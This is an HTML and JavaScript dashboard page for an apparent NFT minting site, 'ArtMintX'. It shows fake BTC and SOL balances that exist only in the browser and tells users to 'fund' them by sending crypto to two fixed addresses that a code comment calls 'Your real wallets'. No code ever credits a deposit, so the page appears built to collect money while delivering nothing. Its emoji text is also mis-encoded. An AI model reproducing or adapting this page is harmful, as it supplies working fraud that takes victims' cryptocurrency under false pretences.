<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dashboard - ArtMintX</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      margin: 0;
      padding: 20px;
    }
    .wallet {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      margin-bottom: 20px;
    }
    .wallet h2 { margin: 0 0 10px; }
    .wallet button {
      margin-top: 10px;
      padding: 10px 15px;
      border: none;
      background: #007bff;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }
    .wallet button:hover { background: #0056b3; }
    #mintModal {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      justify-content: center; align-items: center;
    }
    #mintModal .content {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      width: 300px;
    }
    #uploadForm {
      display: none;
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <h1>Welcome to Your Dashboard</h1>

  <!-- Wallets -->
  <div class="wallet">
    <h2>BTC Wallet Balance: <span id="btcBalance">0.000</span> USD</h2>
    <button onclick="fundWallet('BTC')">Fund BTC Wallet</button>
  </div>

  <div class="wallet">
    <h2>SOL Wallet Balance: <span id="solBalance">0.000</span> USD</h2>
    <button onclick="fundWallet('SOL')">Fund SOL Wallet</button>
  </div>

  <!-- Mint Button -->
  <div class="wallet">
    <h2>Mint Your Artwork</h2>
    <button onclick="openMintModal()">Mint Artwork</button>
  </div>

  <!-- Minting Modal -->
  <div id="mintModal">
    <div class="content">
      <h2>Select Wallet</h2>
      <p>You must pay a $10 minting fee.</p>
      <button onclick="payWithBTC()">Pay with BTC</button>
      <button onclick="payWithSOL()">Pay with SOL</button>
      <br><br>
      <button onclick="closeMintModal()">Cancel</button>
    </div>
  </div>

  <!-- Upload Form -->
  <div id="uploadForm">
    <h3>Upload Artwork</h3>
    <input type="file" id="artFile"><br><br>
    <input type="number" id="artPrice" placeholder="Set your price in USD"><br><br>
    <button onclick="completeMint()">Finish Minting</button>
  </div>

  <script>
    // Starting balances
    let btcBalance = 0.000;
    let solBalance = 0.000;

    // Your real wallets
    const BTC_ADDRESS = "bc1qq6tzrya3sn5m3nee6f6vzfa59wprvplkj45ulk";
    const SOL_ADDRESS = "G2GYyxj4bjzdrxX4BUrgFFiB63e9QvcqbzPMuruRdBu1";

    // Update balance display
    function updateBalances() {
      document.getElementById("btcBalance").textContent = btcBalance.toFixed(3);
      document.getElementById("solBalance").textContent = solBalance.toFixed(3);
    }

    // Fund wallet popup
    function fundWallet(type) {
      if (type === "BTC") {
        alert("Send BTC to fund your wallet:\n\n" + BTC_ADDRESS);
      } else {
        alert("Send SOL to fund your wallet:\n\n" + SOL_ADDRESS);
      }
    }

    // Mint modal controls
    function openMintModal() {
      document.getElementById("mintModal").style.display = "flex";
    }
    function closeMintModal() {
      document.getElementById("mintModal").style.display = "none";
    }

    // Pay with BTC
    function payWithBTC() {
      if (btcBalance >= 10) {
        btcBalance -= 10;
        updateBalances();
        alert("‚úÖ $10 deducted from your BTC wallet. You can now upload your artwork!");
        closeMintModal();
        document.getElementById("uploadForm").style.display = "block";
      } else {
        alert("‚ùå Insufficient BTC balance. Fund your wallet first.");
        fundWallet("BTC");
      }
    }

    // Pay with SOL
    function payWithSOL() {
      if (solBalance >= 10) {
        solBalance -= 10;
        updateBalances();
        alert("‚úÖ $10 deducted from your SOL wallet. You can now upload your artwork!");
        closeMintModal();
        document.getElementById("uploadForm").style.display = "block";
      } else {
        alert("‚ùå Insufficient SOL balance. Fund your wallet first.");
        fundWallet("SOL");
      }
    }

    // Complete minting
    function completeMint() {
      let file = document.getElementById("artFile").files[0];
      let price = document.getElementById("artPrice").value;
      if (!file || !price) {
        alert("Please upload your artwork and set a price.");
        return;
      }
      alert("üéâ Artwork minted successfully!\nPrice: $" + price);
      document.getElementById("uploadForm").style.display = "none";
    }

    // Initial balance display
    updateBalances();
  </script>
</body>
</html>
